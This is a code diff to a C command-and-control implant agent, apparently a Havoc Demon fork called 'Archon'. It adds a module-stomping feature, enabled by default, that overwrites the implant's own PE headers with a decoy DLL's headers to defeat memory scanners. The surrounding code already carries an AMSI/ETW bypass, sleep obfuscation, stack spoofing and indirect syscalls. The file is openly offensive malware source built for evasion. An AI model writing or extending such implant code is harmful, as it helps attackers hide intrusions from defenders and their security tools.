@@ -21,6 +21,9 @@
 /* ARC-01: process-wide AMSI/ETW bypass */
 #include <core/AmsiEtwBypass.h>
 
+/* ARC-05: module stomping for injected DLL payload */
+#include <inject/ModuleStomp.h>
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
@@ -534,6 +537,15 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
+    /* ARC-05: stomp our own DLL's PE headers with a decoy to defeat memory
+     * scanners.  Must run after ModuleBase is known and before the agent
+     * enters the main routine (headers are only needed during init). */
+    if ( Instance->Config.Implant.ModuleStomp && Instance->Session.ModuleBase ) {
+        if ( ! NT_SUCCESS( ModuleStompHeaders() ) ) {
+            PUTS( "[INIT] Warning: module header stomp failed" )
+        }
+    }
+
 #if _WIN64
     Instance->Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
     Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
@@ -655,6 +667,11 @@ VOID DemonConfig()
      * appended to the config blob and parsed here instead of hardcoded. */
     Instance->Config.Implant.HeapEnc = TRUE;
 
+    /* ARC-05: module stomping for injected DLL payload — default ON.
+     * Overwrites Archon's own PE headers with a decoy DLL's headers
+     * after initialization to defeat memory scanners. */
+    Instance->Config.Implant.ModuleStomp = TRUE;
+
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
         " - Technique: %d \n"
@@ -662,13 +679,15 @@ VOID DemonConfig()
         "[CONFIG] ProxyLoading: %d\n"
         "[CONFIG] SysIndirect : %s\n"
         "[CONFIG] AmsiEtwPatch: %d\n"
-        "[CONFIG] HeapEnc     : %s\n",
+        "[CONFIG] HeapEnc     : %s\n"
+        "[CONFIG] ModuleStomp : %s\n",
         Instance->Config.Implant.SleepMaskTechnique,
         Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
         Instance->Config.Implant.ProxyLoading,
         Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
         Instance->Config.Implant.AmsiEtwPatch,
-        Instance->Config.Implant.HeapEnc ? "TRUE" : "FALSE"
+        Instance->Config.Implant.HeapEnc ? "TRUE" : "FALSE",
+        Instance->Config.Implant.ModuleStomp ? "TRUE" : "FALSE"
     )
 
 #ifdef TRANSPORT_HTTP
